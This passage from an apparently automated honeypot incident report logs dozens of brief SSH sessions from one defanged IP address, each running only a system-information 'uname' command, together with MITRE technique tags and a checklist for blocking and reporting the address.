| `2026-07-30 16:36:47` | `cowrie.login.success` |
| `2026-07-30 16:36:49` | `cowrie.session.params` |
| `2026-07-30 16:36:49` | `cowrie.command.input` |
| `2026-07-30 16:36:49` | `cowrie.log.closed` |
| `2026-07-30 16:36:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a05522232e1b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:53` | `cowrie.session.connect` |
| `2026-07-30 16:36:53` | `cowrie.client.version` |
| `2026-07-30 16:36:53` | `cowrie.client.kex` |
| `2026-07-30 16:36:53` | `cowrie.login.success` |
| `2026-07-30 16:36:54` | `cowrie.session.params` |
| `2026-07-30 16:36:54` | `cowrie.command.input` |
| `2026-07-30 16:36:54` | `cowrie.log.closed` |
| `2026-07-30 16:36:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f11886cbe472

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:36 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:36:58` | `cowrie.session.connect` |
| `2026-07-30 16:36:58` | `cowrie.client.version` |
| `2026-07-30 16:36:58` | `cowrie.client.kex` |
| `2026-07-30 16:36:59` | `cowrie.login.success` |
| `2026-07-30 16:37:00` | `cowrie.session.params` |
| `2026-07-30 16:37:00` | `cowrie.command.input` |
| `2026-07-30 16:37:00` | `cowrie.log.closed` |
| `2026-07-30 16:37:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9be647f5956d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:04` | `cowrie.session.connect` |
| `2026-07-30 16:37:04` | `cowrie.client.version` |
| `2026-07-30 16:37:04` | `cowrie.client.kex` |
| `2026-07-30 16:37:04` | `cowrie.login.success` |
| `2026-07-30 16:37:05` | `cowrie.session.params` |
| `2026-07-30 16:37:05` | `cowrie.command.input` |
| `2026-07-30 16:37:05` | `cowrie.log.closed` |
| `2026-07-30 16:37:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa0d030cbeac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:10` | `cowrie.session.connect` |
| `2026-07-30 16:37:10` | `cowrie.client.version` |
| `2026-07-30 16:37:10` | `cowrie.client.kex` |
| `2026-07-30 16:37:11` | `cowrie.login.success` |
| `2026-07-30 16:37:12` | `cowrie.session.params` |
| `2026-07-30 16:37:12` | `cowrie.command.input` |
| `2026-07-30 16:37:12` | `cowrie.log.closed` |
| `2026-07-30 16:37:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88a9dda7f50

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:16` | `cowrie.session.connect` |
| `2026-07-30 16:37:16` | `cowrie.client.version` |
| `2026-07-30 16:37:17` | `cowrie.client.kex` |
| `2026-07-30 16:37:17` | `cowrie.login.success` |
| `2026-07-30 16:37:18` | `cowrie.session.params` |
| `2026-07-30 16:37:18` | `cowrie.command.input` |
| `2026-07-30 16:37:19` | `cowrie.log.closed` |
| `2026-07-30 16:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e4cec698328

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:22` | `cowrie.session.connect` |
| `2026-07-30 16:37:22` | `cowrie.client.version` |
| `2026-07-30 16:37:22` | `cowrie.client.kex` |
| `2026-07-30 16:37:23` | `cowrie.login.success` |
| `2026-07-30 16:37:24` | `cowrie.session.params` |
| `2026-07-30 16:37:24` | `cowrie.command.input` |
| `2026-07-30 16:37:24` | `cowrie.log.closed` |
| `2026-07-30 16:37:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a20b3f6654e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:28` | `cowrie.session.connect` |
| `2026-07-30 16:37:28` | `cowrie.client.version` |
| `2026-07-30 16:37:28` | `cowrie.client.kex` |
| `2026-07-30 16:37:29` | `cowrie.login.success` |
| `2026-07-30 16:37:30` | `cowrie.session.params` |
| `2026-07-30 16:37:30` | `cowrie.command.input` |
| `2026-07-30 16:37:30` | `cowrie.log.closed` |
| `2026-07-30 16:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33ab43f8d50f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:34` | `cowrie.session.connect` |
| `2026-07-30 16:37:34` | `cowrie.client.version` |
| `2026-07-30 16:37:34` | `cowrie.client.kex` |
| `2026-07-30 16:37:34` | `cowrie.login.success` |
| `2026-07-30 16:37:35` | `cowrie.session.params` |
| `2026-07-30 16:37:35` | `cowrie.command.input` |
| `2026-07-30 16:37:36` | `cowrie.log.closed` |
| `2026-07-30 16:37:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-957915eaa8e6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:39` | `cowrie.session.connect` |
| `2026-07-30 16:37:39` | `cowrie.client.version` |
| `2026-07-30 16:37:39` | `cowrie.client.kex` |
| `2026-07-30 16:37:40` | `cowrie.login.success` |
| `2026-07-30 16:37:41` | `cowrie.session.params` |
| `2026-07-30 16:37:41` | `cowrie.command.input` |
| `2026-07-30 16:37:41` | `cowrie.log.closed` |
| `2026-07-30 16:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72cf36fe334a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:45` | `cowrie.session.connect` |
| `2026-07-30 16:37:45` | `cowrie.client.version` |
| `2026-07-30 16:37:45` | `cowrie.client.kex` |
| `2026-07-30 16:37:46` | `cowrie.login.success` |
| `2026-07-30 16:37:47` | `cowrie.session.params` |
| `2026-07-30 16:37:47` | `cowrie.command.input` |
| `2026-07-30 16:37:47` | `cowrie.log.closed` |
| `2026-07-30 16:37:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7d960051b15

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:51` | `cowrie.session.connect` |
| `2026-07-30 16:37:51` | `cowrie.client.version` |
| `2026-07-30 16:37:51` | `cowrie.client.kex` |
| `2026-07-30 16:37:52` | `cowrie.login.success` |
| `2026-07-30 16:37:53` | `cowrie.session.params` |
| `2026-07-30 16:37:53` | `cowrie.command.input` |
| `2026-07-30 16:37:53` | `cowrie.log.closed` |
| `2026-07-30 16:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beae100c9621

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:37 |
| **Last Seen** | 2026-07-30 16:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:37:56` | `cowrie.session.connect` |
| `2026-07-30 16:37:56` | `cowrie.client.version` |
| `2026-07-30 16:37:57` | `cowrie.client.kex` |
| `2026-07-30 16:37:57` | `cowrie.login.success` |
| `2026-07-30 16:37:58` | `cowrie.session.params` |
| `2026-07-30 16:37:58` | `cowrie.command.input` |
| `2026-07-30 16:37:59` | `cowrie.log.closed` |
| `2026-07-30 16:37:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2d3152abd7c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:02` | `cowrie.session.connect` |
| `2026-07-30 16:38:02` | `cowrie.client.version` |
| `2026-07-30 16:38:02` | `cowrie.client.kex` |
| `2026-07-30 16:38:03` | `cowrie.login.success` |
| `2026-07-30 16:38:04` | `cowrie.session.params` |
| `2026-07-30 16:38:04` | `cowrie.command.input` |
| `2026-07-30 16:38:04` | `cowrie.log.closed` |
| `2026-07-30 16:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ccfad3a99ae0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:08` | `cowrie.session.connect` |
| `2026-07-30 16:38:08` | `cowrie.client.version` |
| `2026-07-30 16:38:08` | `cowrie.client.kex` |
| `2026-07-30 16:38:09` | `cowrie.login.success` |
| `2026-07-30 16:38:10` | `cowrie.session.params` |
| `2026-07-30 16:38:10` | `cowrie.command.input` |
| `2026-07-30 16:38:10` | `cowrie.log.closed` |
| `2026-07-30 16:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5447743c4607

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:14` | `cowrie.session.connect` |
| `2026-07-30 16:38:14` | `cowrie.client.version` |
| `2026-07-30 16:38:14` | `cowrie.client.kex` |
| `2026-07-30 16:38:15` | `cowrie.login.success` |
| `2026-07-30 16:38:16` | `cowrie.session.params` |
| `2026-07-30 16:38:16` | `cowrie.command.input` |
| `2026-07-30 16:38:16` | `cowrie.log.closed` |
| `2026-07-30 16:38:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fee8d9716ea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:20` | `cowrie.session.connect` |
| `2026-07-30 16:38:20` | `cowrie.client.version` |
| `2026-07-30 16:38:20` | `cowrie.client.kex` |
| `2026-07-30 16:38:20` | `cowrie.login.success` |
| `2026-07-30 16:38:21` | `cowrie.session.params` |
| `2026-07-30 16:38:21` | `cowrie.command.input` |
| `2026-07-30 16:38:21` | `cowrie.log.closed` |
| `2026-07-30 16:38:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-410aed6d143c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:25` | `cowrie.session.connect` |
| `2026-07-30 16:38:25` | `cowrie.client.version` |
| `2026-07-30 16:38:25` | `cowrie.client.kex` |
| `2026-07-30 16:38:26` | `cowrie.login.success` |
| `2026-07-30 16:38:27` | `cowrie.session.params` |
| `2026-07-30 16:38:27` | `cowrie.command.input` |
| `2026-07-30 16:38:27` | `cowrie.log.closed` |
| `2026-07-30 16:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be197c4eccd2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:31` | `cowrie.session.connect` |
| `2026-07-30 16:38:31` | `cowrie.client.version` |
| `2026-07-30 16:38:31` | `cowrie.client.kex` |
| `2026-07-30 16:38:32` | `cowrie.login.success` |
| `2026-07-30 16:38:33` | `cowrie.session.params` |
| `2026-07-30 16:38:33` | `cowrie.command.input` |
| `2026-07-30 16:38:33` | `cowrie.log.closed` |
| `2026-07-30 16:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a95931d8dbd9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:37` | `cowrie.session.connect` |
| `2026-07-30 16:38:37` | `cowrie.client.version` |
| `2026-07-30 16:38:37` | `cowrie.client.kex` |
| `2026-07-30 16:38:38` | `cowrie.login.success` |
| `2026-07-30 16:38:39` | `cowrie.session.params` |
| `2026-07-30 16:38:39` | `cowrie.command.input` |
| `2026-07-30 16:38:39` | `cowrie.log.closed` |
| `2026-07-30 16:38:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d788f4a0a74b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:43` | `cowrie.session.connect` |
| `2026-07-30 16:38:43` | `cowrie.client.version` |
| `2026-07-30 16:38:43` | `cowrie.client.kex` |
| `2026-07-30 16:38:44` | `cowrie.login.success` |
| `2026-07-30 16:38:45` | `cowrie.session.params` |
| `2026-07-30 16:38:45` | `cowrie.command.input` |
| `2026-07-30 16:38:45` | `cowrie.log.closed` |
| `2026-07-30 16:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71b4e73a6022

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:48` | `cowrie.session.connect` |
| `2026-07-30 16:38:49` | `cowrie.client.version` |
| `2026-07-30 16:38:49` | `cowrie.client.kex` |
| `2026-07-30 16:38:50` | `cowrie.login.success` |
| `2026-07-30 16:38:51` | `cowrie.session.params` |
| `2026-07-30 16:38:51` | `cowrie.command.input` |
| `2026-07-30 16:38:52` | `cowrie.log.closed` |
| `2026-07-30 16:38:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9b8d6dce1f0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:38 |
| **Last Seen** | 2026-07-30 16:38 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:38:54` | `cowrie.session.connect` |
| `2026-07-30 16:38:55` | `cowrie.client.version` |
| `2026-07-30 16:38:55` | `cowrie.client.kex` |
| `2026-07-30 16:38:56` | `cowrie.login.success` |
| `2026-07-30 16:38:57` | `cowrie.session.params` |
| `2026-07-30 16:38:57` | `cowrie.command.input` |
| `2026-07-30 16:38:57` | `cowrie.log.closed` |
| `2026-07-30 16:38:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2532fe16500a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:00` | `cowrie.session.connect` |
| `2026-07-30 16:39:00` | `cowrie.client.version` |
| `2026-07-30 16:39:00` | `cowrie.client.kex` |
| `2026-07-30 16:39:01` | `cowrie.login.success` |
| `2026-07-30 16:39:02` | `cowrie.session.params` |
| `2026-07-30 16:39:02` | `cowrie.command.input` |
| `2026-07-30 16:39:02` | `cowrie.log.closed` |
| `2026-07-30 16:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4539024e69a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:06` | `cowrie.session.connect` |
| `2026-07-30 16:39:06` | `cowrie.client.version` |
| `2026-07-30 16:39:06` | `cowrie.client.kex` |
| `2026-07-30 16:39:07` | `cowrie.login.success` |
| `2026-07-30 16:39:08` | `cowrie.session.params` |
| `2026-07-30 16:39:08` | `cowrie.command.input` |
| `2026-07-30 16:39:08` | `cowrie.log.closed` |
| `2026-07-30 16:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca330992929e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 16:39:12` | `cowrie.session.connect` |
| `2026-07-30 16:39:12` | `cowrie.client.version` |
| `2026-07-30 16:39:12` | `cowrie.client.kex` |
| `2026-07-30 16:39:13` | `cowrie.login.success` |
| `2026-07-30 16:39:14` | `cowrie.session.params` |
| `2026-07-30 16:39:14` | `cowrie.command.input` |
| `2026-07-30 16:39:14` | `cowrie.log.closed` |
| `2026-07-30 16:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]202` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa27ac3a1a4a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]202` |
| **First Seen** | 2026-07-30 16:39 |
| **Last Seen** | 2026-07-30 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
